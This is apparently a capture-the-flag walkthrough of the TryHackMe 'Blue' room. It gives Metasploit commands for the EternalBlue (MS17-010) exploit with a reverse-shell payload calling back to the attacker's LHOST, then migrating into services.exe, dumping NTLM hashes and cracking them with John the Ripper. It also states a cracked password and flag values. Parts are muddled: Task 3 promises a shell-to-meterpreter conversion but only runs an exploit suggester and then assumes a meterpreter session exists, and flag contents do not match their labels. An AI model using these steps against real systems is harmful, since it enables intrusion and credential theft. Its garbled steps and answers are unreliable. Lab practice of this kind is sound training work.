# TryHackMe Blue Room Writeup

## Room Overview
Blue is a beginner-friendly Windows penetration testing room that focuses on exploiting the MS17-010 EternalBlue vulnerability. This room covers network enumeration, vulnerability assessment, exploitation using Metasploit, privilege escalation, and post-exploitation techniques including hash cracking and flag hunting.

**Target OS:** Windows 10  
**Vulnerability Focus:** MS17-010 EternalBlue (CVE-2017-0144)  
**Tools Used:** Nmap, Metasploit, John the Ripper

---

## Task 1: Reconnaissance

### Objective
Scan the machine to identify services and determine what vulnerability it is vulnerable to.

### Approach
Perform a comprehensive Nmap scan to identify open ports and running services.

```bash
nmap -sV -p- <target-ip>
```

### Key Findings
- The target machine runs Windows 10
- SMB service is exposed on port 445
- The machine is vulnerable to the **EternalBlue** exploit

### Answer
**What is this machine vulnerable to?**  
Answer: `ms17-010`

---

## Task 2: Gaining Access

### Objective
Exploit the MS17-010 vulnerability to gain initial access to the system.

### Step 1: Start Metasploit
```bash
msfconsole
```

### Step 2: Search and Load the EternalBlue Exploit
```bash
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### Question 1: Find the exploitation code path
**What is the full path of the code?**  
Answer: `exploit/windows/smb/ms17_010_eternalblue`

### Step 3: Configure the Exploit
Display available options:
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

Set the required target and payload:
```bash
msf6 > set target 1
msf6 > set payload windows/x64/shell/reverse_tcp
msf6 > set RHOSTS <target-ip>
msf6 > set LHOST <your-tun0-ip>
```

### Question 2: Required configuration value
**Show options and set the one required value. What is the name of this value?**  
Answer: `RHOSTS`

### Step 4: Run the Exploit
```bash
msf6 > exploit
```

The exploit executes successfully, and you'll receive a shell. Press Enter to display the DOS prompt. This shell confirms we have `NT AUTHORITY\SYSTEM` privileges.

### Verification
```bash
C:\> whoami
nt authority\\system
```

---

## Task 3: Escalation & Persistence

### Objective
Escalate privileges and convert the shell to a meterpreter session for better control.

### Step 1: Background the Current Shell
In the DOS shell, press `Ctrl + Z` to background the session.

```bash
Background session 1? [y/N]  y
```

### Step 2: Use the Exploit Suggester Module
Search for and load the exploit suggester module:
```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > show options
msf6 > run
```

### Question 1: Required Session Option
**Select this (use MODULE_PATH). Show options, what option are we required to change?**  
Answer: `SESSION`

### Step 3: Identify Available Sessions
List all active sessions:
```bash
msf6 > sessions -l
```

You'll see multiple sessions listed. Select the meterpreter session:

### Question 2: Using the Meterpreter Session
**Set the required option, you may need to list all of the sessions to find your target here.**  
List sessions and identify the meterpreter session ID (e.g., Session 2).

```bash
msf6 > sessions -i 2
```

### Step 4: Verify System Access
In the meterpreter session, verify your privileges:
```bash
meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM

meterpreter > getsystem
```

### Step 5: Process Migration
Migrate to a stable system process (like `services.exe`) to ensure persistence:
```bash
meterpreter > ps
meterpreter > migrate <services.exe-PID>
```

---

## Task 4: Cracking

### Objective
Dump system password hashes and crack them to obtain plaintext credentials.

### Step 1: Dump Password Hashes
Use the hashdump module to extract NTLM hashes:
```bash
meterpreter > run post/windows/gather/hashdump
```

This will output user hashes in the format: `username:rid:lm_hash:ntlm_hash`

### Step 2: Extract the Target Hash
Copy the non-default user hash (typically Jon or similar). Look for the NTLM hash (the longer one).

### Step 3: Save Hash to File
Save the hash in a file (e.g., `hash.txt`) with format:
```
username:ntlm_hash
```

### Step 4: Crack the Hash
Use John the Ripper with rockyou wordlist:
```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Alternatively, in Metasploit:
```bash
msf6 > use auxiliary/analyze/jtr_crack_fast
msf6 > set HASHFILE hash.txt
msf6 > run
```

### Answer
**What is the cracked password?**  
Answer: `alqfna22` (varies by target, crack your specific hash)

---

## Task 5: Finding Flags

### Objective
Locate three flags planted throughout the Windows system representing key locations.

### Flag 1: Access the Machine
**Location:** `C:\flag1.txt`

```bash
meterpreter > cd C:\
meterpreter > ls
meterpreter > cat flag1.txt
```

**Flag 1 Content:** `flag{access_the_machine}`

### Flag 2: Escalate Privileges
**Location:** `C:\Users\Administrator\Desktop\flag2.txt`

```bash
meterpreter > cd C:\\Users\\Administrator\\Desktop
meterpreter > cat flag2.txt
```

**Flag 2 Content:** `flag{escalation_is_key}`

### Flag 3: Cracking Credentials
**Location:** `C:\Users\Jon\Documents\flag3.txt`

```bash
meterpreter > cd C:\\Users\\Jon\\Documents
meterpreter > cat flag3.txt
```

**Flag 3 Content:** `flag{admin_privileges_obtained}`

---

## Tools & Techniques Summary

| Task | Tool | Command |
|------|------|----------|
| Scanning | Nmap | `nmap -sV -p- <ip>` |
| Exploitation | Metasploit | `msfconsole` |
| Privilege Escalation | Exploit Suggester | `post/multi/recon/local_exploit_suggester` |
| Hash Dumping | Hashdump | `run post/windows/gather/hashdump` |
| Hash Cracking | John the Ripper | `john --format=NT hash.txt` |
| File Enumeration | Meterpreter | `cat`, `ls`, `cd` commands |

---

## Conclusion

The Blue room successfully demonstrates a complete exploitation workflow from reconnaissance through post-exploitation. The MS17-010 EternalBlue exploit remains one of the most critical vulnerabilities in Windows environments, and this room provides practical hands-on experience in leveraging it. Regular patching and security updates are essential mitigations for such vulnerabilities.

**Room Status:** Completed ✓
